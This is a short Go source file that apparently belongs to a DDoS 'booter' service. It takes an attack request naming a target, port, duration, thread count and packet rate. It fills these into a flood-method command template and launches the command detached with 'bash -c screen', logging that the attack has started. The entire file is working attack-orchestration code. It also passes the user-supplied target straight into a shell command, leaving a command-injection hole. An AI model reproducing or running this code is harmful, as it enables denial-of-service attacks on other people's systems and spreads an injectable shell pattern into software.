package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var ongoing map[string]*attack

type attack struct {
	user     int
	target   string
	cmd      string
	duration int
	created  int64
	end      int64
}

func Attack(atk *AttackMessage) {
	command := methods[strings.ToLower(atk.Data.Method)]
	replace := strings.NewReplacer(
		"$target", atk.Data.Target,
		"$threads", atk.Options.Threads,
		"$port", atk.Data.Port,
		"$time", atk.Data.Duration,
		"$pps", atk.Options.PPS,
	)
	commandnew := replace.Replace(command)
	//logger.Println(commandnew)
	duration, _ := strconv.Atoi(atk.Data.Duration)
	a := &attack{
		user:    atk.Data.User,
		target:  atk.Data.Target,
		cmd:     commandnew,
		created: time.Now().Unix(),
		end:     time.Now().Unix() + int64(duration),
	}
	go a.flood(context.TODO())
}

func (atk *attack) flood(ctx context.Context) {
	cmd := exec.Command("bash", "-c", "screen -dmS "+fmt.Sprintf("%d@%s", atk.user, atk.target)+" "+atk.cmd+"")
	logger.Println(cmd)
	cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
	if err := cmd.Run(); err != nil {
		logger.Println(err)
	}
	logger.Println("succesfully started attack on \"" + atk.target + "\"")
}
